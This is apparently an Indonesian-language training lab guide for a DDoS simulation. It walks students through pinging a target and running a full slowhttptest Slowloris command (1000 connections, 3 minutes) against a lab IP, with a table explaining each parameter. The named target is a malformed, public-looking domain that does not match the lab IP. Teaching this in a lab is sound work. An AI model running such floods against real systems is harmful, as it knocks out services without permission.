DDOS Attack Simulation

Tampilan awal desain DDOS Lab (belum terhubung ke VM).

Step by Step

Pada tahap ini silahkan hidupkan virtual machine disamping.

berikut adalah target yang akan kamu gunakan dalam melakukan ddos (https.www.asaas.com).

Pada tahap ini silahkan lakukan pengecekan ip untuk mengetahui ip address target serangan. silahkan gunakan code disamping ping ((alamat website))

langgkah selanjutnya yaitu melakukan serangan ddos dengan menggunakan tools slowhttptest. dengan cara mambanjiri target dengan traffic palsu.

berikut adalah codenya!!

slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://192.168.1.202/index.php -x 24 -p 3

Parameter Fungsi
-c 1000 Mensimulasikan 1000 koneksi klien lambat
-H Menggunakan teknik Slowloris (header lambat)
-g Menghasilkan file grafik (output .html)
-o slowhttp Output file diberi nama “slowhttp”
-i 10 Interval antara dua paket header = 10 detik
-r 200 Rate koneksi baru = 200 koneksi/detik
-t GET Jenis request GET lambat
-u http://192.168.1.202/index.php Target dalam LAB kamu sendiri
-x 24 Timeout connection 24 detik
-p 3 Durasi test = 3 menit

silahkan jalankan code dari slowhttptest dengan target, jumlah, dan waktu serangan yang telah ditentukan.

silahkan deskripsikan hasil dari yang kamu lakukan.
